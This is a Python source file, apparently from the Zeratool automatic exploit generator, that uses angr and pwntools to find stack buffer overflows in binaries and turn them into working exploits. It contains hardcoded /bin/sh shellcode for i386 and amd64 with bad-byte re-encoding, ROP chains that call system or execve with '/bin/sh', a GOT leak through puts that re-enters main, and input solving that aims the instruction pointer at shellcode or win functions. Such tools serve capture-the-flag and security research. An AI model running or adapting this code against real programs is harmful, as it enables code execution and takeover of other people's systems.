import claripy
from .radare_helper import findShellcode
from pwn import *
import timeout_decorator
import logging

logging.getLogger("pwnlib.elf.elf").disabled = True

log = logging.getLogger(__name__)

is_printable = False


def constrainToAddress(state, sym_val, addr, endian="little"):

    bits = state.arch.bits
    padded_addr = 0

    if bits == 32:
        padded_addr = p32(addr, endian=endian)
    elif bits == 64:
        botAddr = addr & 0xFFFFFFFF
        topAddr = (addr >> 32) & 0xFFFFFFFF
        padded_addr = p32(topAddr, endian=endian) + p32(botAddr, endian=endian)

    constraints = []
    for i in range(bits / 8):
        curr_byte = sym_val.get_byte(i)
        constraint = claripy.And(curr_byte == padded_addr[i])
        if state.se.satisfiable(extra_constraints=[constraint]):
            constraints.append(constraint)

    return constraints


def getShellcode(properties):
    context.arch = properties["protections"]["arch"]
    context.bits = 32

    if context.arch == "i386":  # /bin/sh shellcode - 23 bytes
        shellcode = (
            b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
            + b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        )
    elif context.arch == "amd64":  # /bin/sh shellcode - 23 bytes
        context.bits = 64
        shellcode = (
            b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
            + b"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
        )
    else:
        assembly = shellcraft.sh()  # This works, but the shellcode is usually long
        shellcode = asm(assembly)
    return shellcode


def get_leak_rop_chain(properties, leak_num=-1):
    context.binary = properties["file"]
    elf = ELF(properties["file"])
    rop = ROP(elf)

    print_functions = ["puts"]
    leak_function = list(elf.got)[leak_num]
    log.info("elf.got : {}".format(elf.got))
    log.info("Leaking {}".format(leak_function))

    ret_func = None

    # Find the function we want to call
    # Just puts for right now
    for function in print_functions:
        log.debug(function)
        log.debug(elf.plt)
        if function in elf.plt:
            ret_func = elf.plt[function]
            break
        elif function in elf.symbols:
            ret_func = elf.symbols[function]
            break
    if ret_func is None:
        raise RuntimeError("Cannot find symbol to return to")

    # movabs
    rop.raw(rop.ret.address)
    rop.call(ret_func, [elf.got[leak_function]])
    if "main" in elf.symbols:  # Retrigger exploit
        rop.call(elf.symbols["main"])
    else:
        log.error("No main symbol exposed, can't auto call")

    log.info("\n{}".format(rop.dump()))

    return rop, rop.build()


def get_rop_chain(properties):
    context.binary = properties["file"]
    elf = ELF(properties["file"])
    rop = ROP(elf)

    strings = [b"/bin/sh\x00", b"/bin/bash\x00"]
    functions = ["execve", "system"]

    ret_func = None
    ret_string = None

    # Find the function we want to call
    for function in functions:
        if function in elf.plt:
            ret_func = elf.plt[function]
            break
        elif function in elf.symbols:
            ret_func = elf.symbols[function]
            break

    # Find the string we want to pass it
    for string in strings:
        str_occurences = list(elf.search(string))
        if str_occurences:
            ret_string = str_occurences[0]
            break

    # If we can't find our symbols and string in the binary
    # we may need to check our libc bin
    if properties.get("libc", None):
        log.info("[~] Provied libc, using leak and lib to build chain")
        libc = ELF(properties["libc"])
        # Set libc loaded address
        libc.address = properties["libc_base_address"]

        # Find the function we want to call
        for function in functions:
            if function in libc.plt:
                ret_func = libc.plt[function]
                break
            elif function in libc.symbols:
                ret_func = libc.symbols[function]
                break

        # Find the string we want to pass it
        for string in strings:
            str_occurences = list(libc.search(string))
            if str_occurences:
                ret_string = str_occurences[0]
                break
        rop = ROP(libc)

    if not ret_func:
        raise RuntimeError("Cannot find symbol to return to")
    if not ret_string:
        raise RuntimeError("Cannot find string to pass to system or exec call")

    # movabs fix
    rop.raw(rop.ret.address)
    if properties.get("libc", None):
        rop.call(ret_func, [ret_string, 0, 0])
    else:
        # If we don't have libc we probably don't have all the nice
        # gadgets
        rop.call(ret_func, [ret_string])

    log.info("\n{}".format(rop.dump()))

    return rop, rop.build()


def find_symbolic_buffer(state, length, arg=None):
    """
    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's
    control
    """
    # get all the symbolic bytes from stdin
    user_input = state.globals["user_input"]

    sym_addrs = []
    sym_addrs.extend(state.memory.addrs_for_name(next(iter(user_input.variables))))

    for addr in sym_addrs:
        if check_continuity(addr, sym_addrs, length):
            yield addr


def check_continuity(address, addresses, length):
    """
    dumb way of checking if the region at 'address' contains 'length' amount of controlled
    memory.
    """

    for i in range(length):
        if not address + i in addresses:
            return False

    return True


def overflow_detect_filter(simgr):

    for state in simgr.unconstrained:
        bits = state.arch.bits
        num_count = bits / 8
        pc_value = b"C" * int(num_count)

        # Check satisfiability
        if state.solver.satisfiable(extra_constraints=[state.regs.pc == pc_value]):

            state.add_constraints(state.regs.pc == pc_value)
            user_input = state.globals["user_input"]

            log.info("Found vulnerable state.")

            if is_printable:
                log.info("Constraining input to be printable")
                for c in user_input.chop(8):
                    constraint = claripy.And(c > 0x2F, c < 0x7F)
                    if state.solver.satisfiable([constraint]):
                        state.add_constraints(constraint)

            # Get input values
            input_bytes = state.solver.eval(user_input, cast_to=bytes)
            log.info("[+] Vulnerable path found {}".format(input_bytes))
            if b"CCCC" in input_bytes:
                log.info("[+] Offset to bytes : {}".format(input_bytes.index(b"CCCC")))
            state.globals["type"] = "Overflow"
            state.globals["input"] = input_bytes
            simgr.stashes["found"].append(state)
            simgr.stashes["unconstrained"].remove(state)
            break

    return simgr


def point_to_win_filter(simgr):

    for state in simgr.unconstrained:
        properties = state.globals["properties"]

        for func in properties["win_functions"]:
            address = properties["win_functions"][func]["fcn_addr"]

            log.info("Trying {}".format(hex(address)))

            # Check satisfiability
            if state.solver.satisfiable(extra_constraints=[state.regs.pc == address]):
                state.add_constraints(state.regs.pc == address)
                user_input = state.globals["user_input"]

                if is_printable:
                    log.info("Constraining input to be printable")
                    for c in user_input.chop(8):
                        constraint = claripy.And(c > 0x2F, c < 0x7F)
                        if state.solver.satisfiable([constraint]):
                            state.add_constraints(constraint)

                # Get the string coming into STDIN
                input_bytes = state.solver.eval(user_input, cast_to=bytes)
                log.info("[+] Vulnerable path found {}".format(input_bytes))
                state.globals["type"] = "Overflow"
                state.globals["input"] = input_bytes
                simgr.stashes["found"].append(state)
                simgr.stashes["unconstrained"].remove(state)
            return simgr

    return simgr


def point_to_shellcode_filter(simgr):
    for state in simgr.unconstrained:
        properties = state.globals["properties"]
        shellcode = getShellcode(properties)
        using_run_time_leak = False

        # Find potential addresses for shellcode
        addresses = [x for x in find_symbolic_buffer(state, len(shellcode))]
        if len(addresses):
            list.sort(addresses)

        # Can we add a nop sled?
        # max_nop_count = 0
        # if addresses:
        #     for x in range(0x50):
        #         bigger_addrs = [
        #             x for x in find_symbolic_buffer(state, len(shellcode) + x)
        #         ]
        #         if bigger_addrs:
        #             addresses = bigger_addrs
        #             max_nop_count = x
        # if max_nop_count > 0:
        #     log.info("Adding {} nops to shellcode".format(max_nop_count))
        #     shellcode = b"\x90" * max_nop_count + shellcode

        # Build shellcode and check for bad chars
        avoidList = []
        for i, address in enumerate(addresses):
            my_buf = state.memory.load(address, len(shellcode))
            if not state.satisfiable(extra_constraints=([my_buf == shellcode])):
                log.info("[~] Shellcode can't be placed. Checking for bad bytes.")
                for i in range(len(shellcode)):
                    curr_byte = state.memory.load(address + i, 1)
                    if state.satisfiable(
                        extra_constraints=([curr_byte == shellcode[i]])
                    ):
                        pass
                        # log.info("[+] Byte {} Can be {}".format(i,repr(shellcode[i])))
                    else:
                        log.info(
                            "[-] Address {} Byte {} Can't be {}".format(
                                hex(address + i), i, repr(shellcode[i])
                            )
                        )
                        avoidList.append(shellcode[i])
                log.info("Avoiding : {}".format(avoidList))
                log.info("Old shellcode: {} {}".format(len(shellcode), repr(shellcode)))
                try:
                    shellcode = encoders.encode(shellcode, avoidList)
                    log.info(
                        "New shellcode: {} {}".format(len(shellcode), repr(shellcode))
                    )
                except PwnlibException:
                    log.info(
                        "[-] Unable to encode shellcode to avoid {}".format(avoidList)
                    )
                except TypeError:
                    raise RuntimeError(
                        "Pwntools encoders not ported to python3. Can't encode shellcode to avoid bad byte"
                    )
                break

        # addresses = [x for x in find_symbolic_buffer(state,len(shellcode))]
        log.info("Trying addresses : {}".format(addresses))
        # Iterate over addresses looking for a winner
        for address in addresses:
            log.info("Trying address {}".format(hex(address)))

            # Setup shellcode
            memory = state.memory.load(address, len(shellcode))
            shellcode_bvv = state.solver.BVV(shellcode)

            if "leaked_type" in state.globals:
                log.info("We have a leak, let's try and use that")

                # Either this is a call during a real run or
                # we're still detecting
                if "run_leak" in properties["pwn_type"]:
                    address = properties["pwn_type"]["run_leak"]
                    # Trust that this leak points to something good
                    using_run_time_leak = True

            constraint = claripy.And(memory == shellcode_bvv, state.regs.pc == address)

            # Check satisfiability
            if state.solver.satisfiable(extra_constraints=[constraint]):
                log.info("[+] Win")
                state.add_constraints(constraint)

                user_input = state.globals["user_input"]

                if is_printable:
                    log.info("Constraining input to be printable")
                    for c in user_input.chop(8):
                        constraint = claripy.And(c > 0x2F, c < 0x7F)
                        if state.solver.satisfiable([constraint]):
                            state.add_constraints(constraint)

                # Get the string coming into STDIN
                input_bytes = state.solver.eval(
                    user_input, cast_to=bytes, extra_constraints=[constraint]
                )

                # r2_address = findShellcode(state.project.filename, \
                #     state.history.bbl_addrs[-1], shellcode, input_bytes)

                # log.info("Got r2 address : {}".format(hex(r2_address['offset'])))
                # log.info("vs {}".format(hex(address)))

                # r2_constraint = claripy.And(memory == shellcode_bvv, state.regs.pc == r2_address)
                # r2_input_bytes = state.solver.eval(user_input, \
                #     cast_to=bytes, extra_constraints=[r2_constraint])

                log.info("[+] Vulnerable path found {}".format(input_bytes))
                state.globals["type"] = "Overflow"
                state.globals["input"] = input_bytes
                simgr.stashes["found"].append(state)
                return simgr

    return simgr


def do_leak_with_ropchain_constrain(elf, rop_chain, new_state, is_32bit=False):
    """
    This is a more traditional build and constrain payload that looks for
    an offset from the initial input and starts placing a rop chain there.

    This method is a pain in the butt to debug, so I'd encourage doing the
    leak with stepping so we know when a gaget breaks, but if the other one
    is breaking, you can try this one.
    """
    log.info("Constraining input to rop chain without single stepping")
    user_input = new_state.globals["user_input"]

    if is_32bit:
        rop_chain_bytes = [x if isinstance(x, int) else u32(x) for x in rop_chain]
        rop_chain_bytes = b"".join([p32(x) for x in rop_chain_bytes])
        pc_index = 3
    else:
        rop_chain_bytes = [x if isinstance(x, int) else u64(x) for x in rop_chain]
        rop_chain_bytes = b"".join([p64(x) for x in rop_chain_bytes])
        pc_index = 7

    bytes_iter = 0
    offset = 0
    start_constraining = False
    for i, x in enumerate(user_input.chop(8)):

        # Hunt for the start of PC overwrite
        if x is new_state.regs.pc.chop(8)[pc_index]:
            log.info("Found PC overwrite at offset : {}".format(i))
            start_constraining = True

        # Assume gadgets are all next to each other on the stack
        # and place them right after each other.
        if start_constraining and bytes_iter < len(rop_chain_bytes):
            if new_state.satisfiable(
                extra_constraints=[x == rop_chain_bytes[bytes_iter]]
            ):
                new_state.add_constraints(x == rop_chain_bytes[bytes_iter])
                bytes_iter += 1
            else:
                log.error(
                    "Not satifiable {} -> {}".format(x, rop_chain_bytes[bytes_iter])
                )
                break

    rop_simgr = new_state.project.factory.simgr(new_state)

    # Verify that these gadgets result in a call to main after the leak
    if new_state.globals["needs_leak"]:
        rop_simgr.explore(
            find=lambda s: elf.symbols["main"] == s.solver.eval(s.regs.pc)
        )
        new_state = rop_simgr.found[0]

    log.info(rop_simgr)

    return user_input, new_state


def do_64bit_leak_with_stepping(elf, rop, rop_chain, new_state):
    # Only amd64 right now
    user_input = new_state.globals["user_input"]
    curr_rop = None
    elf_symbol_addrs = [y for x, y in elf.symbols.items()]

    for i, gadget in enumerate(rop_chain):

        if gadget in rop.gadgets:
            curr_rop = rop.gadgets[gadget]

            # reversing it lets us pop values out easy
            curr_rop.regs.reverse()

        # Case of if we're executing
        if curr_rop is None or gadget in rop.gadgets or len(curr_rop.regs) == 0:

            if new_state.satisfiable(extra_constraints=([new_state.regs.pc == gadget])):
                """
                For the actual ROP gadgets, we're stepping through them
                until we hit an unconstrained value - We did a `ret` back
                onto the symbolic stack.
                This process is slower than just setting the whole stack
                to the chain, but in testing it seems to work more reliably
                """
                log.info("Setting PC to {}".format(hex(gadget)))
                new_state.add_constraints(new_state.regs.pc == gadget)

                if gadget in elf_symbol_addrs:
                    log.info(
                        "gadget is hooked symbol, contraining to real address, but calling SimProc"
                    )
                    symbol = [x for x in elf.symbols.items() if gadget == x[1]][0]
                    p = new_state.project
                    new_state.regs.pc = p.loader.find_symbol(symbol[0]).rebased_addr

                # There is no point in letting our last gadget run, we have all
                # the constraints on our input to trigger the leak
                if i == len(rop_chain) - 1:
                    break

                """
                Since we're stepping through a ROP chain, VEX IR wants to
                try and lift the whole block and emulate a whole block step
                this will break what we're trying to do, so we need to
                tell it to try and emulate single-step execution as closely
                as we can with the opt_level=0    
                """
                rop_simgr = new_state.project.factory.simgr(new_state)
                rop_simgr.explore(opt_level=0)
                new_state = rop_simgr.unconstrained[0]

            else:
                log.error("unsatisfied on {}".format(hex(gadget)))
                break

        # Case for setting registers
        else:
            """
            Usually for 64bit rop chains, we're passing values into
            the argument registers like RDI, so this only covers RDI
            since the auto-rop chain is pretty simple, but we would
            extend this portion to cover all register sets from POP
            calls
            """
            next_reg = curr_rop.regs.pop()
            log.debug("Setting register : {}".format(next_reg))

            gadget_msg = gadget
            if isinstance(gadget, int):
                gadget_msg = hex(gadget)

            state_reg = getattr(new_state.regs, next_reg)
            if state_reg.symbolic and new_state.satisfiable(
                extra_constraints=([state_reg == gadget])
            ):

                log.info("Setting {} to {}".format(next_reg, gadget_msg))

                new_state.add_constraints(state_reg == gadget)
            else:
                log.error("unsatisfied on {} -> {}".format(next_reg, gadget_msg))
                break

            if len(curr_rop.regs) == 0:
                curr_rop = None
    return user_input, new_state


def point_to_ropchain_filter(simgr):

    """
    For angr hooked function that are part of our rop chain,
    like `puts`, we need to force the simulation manager to
    execute through a regular step, without running through
    the hook.
    """
    for state in simgr.active:
        if not state.globals["needs_leak"]:
            properties = state.globals["properties"]
            elf = ELF(properties["file"])
            elf_symbol_addrs = [y for x, y in elf.symbols.items()]
            elf_items = elf.symbols.items()

            pc = state.solver.eval(state.regs.pc)
            if pc in elf_symbol_addrs:
                symbol = [x for x in elf_items if pc == x[1]][0]
                log.debug("hooking : {}".format(symbol))
                state.regs.pc = state.project.loader.find_symbol(symbol[0]).rebased_addr

    """
    We have two main stages when we need a leak,
    the leak stage, which will be the first part of our chain
    and the pwn stage, where we use the leak to set our PC
    to some address relative to the leaked address
    """
    for state in simgr.unconstrained:
        properties = state.globals["properties"]
        elf = ELF(properties["file"])

        if state.globals["needs_leak"]:
            rop, rop_chain = get_leak_rop_chain(properties)
        else:
            rop, rop_chain = get_rop_chain(properties)

        new_state = state.copy()

        if new_state.project.arch.bits == 32:
            user_input, new_state = do_leak_with_ropchain_constrain(
                elf, rop_chain, new_state, is_32bit=True
            )

        else:
            user_input, new_state = do_64bit_leak_with_stepping(
                elf, rop, rop_chain, new_state
            )

            """
            If step-by-step emulation and constraining doesn't work
            another option is to build the entire chain here and load
            the memory starting at the start of chain and add a constraint
            setting it to our rop chain's bytes
            """

            # user_input, new_state = do_leak_with_ropchain_constrain(elf, rop_chain, user_input, new_state, is_32bit=False)

        user_input = new_state.globals["user_input"]

        """
        If we're running with a leak stage, we call it done once we hit our leak,
        since we'll want the actual program runtime leak in our next set of
        constraints.
        """
        if new_state.globals["needs_leak"]:
            new_state.globals["needs_leak"] = False

            simgr.drop(stash="unconstrained")
            simgr.drop(stash="found")
            simgr.stashes["found"].append(new_state)

            new_state.globals["leak_input"] = get_trimmed_input(user_input, new_state)
            new_state.globals["type"] = "leak"

            break

        """
        At this point we're running alongside the actual program and trimming won't
        help our input buffer size, so we just get the raw STDIN and use that for 
        input values
        """
        input_bytes = new_state.posix.dumps(0)
        leak_input = new_state.globals["leak_input"]
        # The +1 here is to account for a newline. The get_trimmed_input function
        # isn't adding the newline character
        pwn_bytes = input_bytes[len(leak_input) + 1 :]

        """
        If Zeratool fails, we atleast want the inputs that trigger the leak an 
        attempted pwn for putting into our own manual exploits
        """
        log.info("[+] Vulnerable path found {}".format(input_bytes))
        log.info("Will leak {} before pwn".format(new_state.globals["leaked_func"]))
        log.info("Leak input : {}".format(leak_input))
        log.info("pwn input : {}".format(pwn_bytes))

        new_state.globals["type"] = "Overflow"
        new_state.globals["input"] = pwn_bytes
        simgr.drop(stash="unconstrained")
        simgr.drop(stash="active")
        simgr.stashes["found"].append(new_state)
        break

    return simgr


def get_trimmed_input(user_input, state):
    trim_index = -1
    index = 0
    for c in user_input.chop(8):
        num_constraints = get_num_constraints(c, state)
        if num_constraints == 0 and trim_index == -1:
            trim_index = index
        else:
            trim_index == -1
        index += 1

    input_bytes = state.solver.eval(user_input, cast_to=bytes)

    if trim_index > 0:
        log.debug("Found input without constraints starting at {}".format(trim_index))
        return input_bytes[:trim_index]

    return input_bytes


def get_num_constraints(chop_byte, state):
    constraints = state.solver.constraints
    i = 0
    # Do any constraints mention this BV?
    for constraint in constraints:
        if any(
            chop_byte.structurally_match(x) for x in constraint.recursive_children_asts
        ):
            i += 1
    # log.info("{} : {} : {}".format(chop_byte,i,state.solver.eval(chop_byte,cast_to=bytes)))
    return i
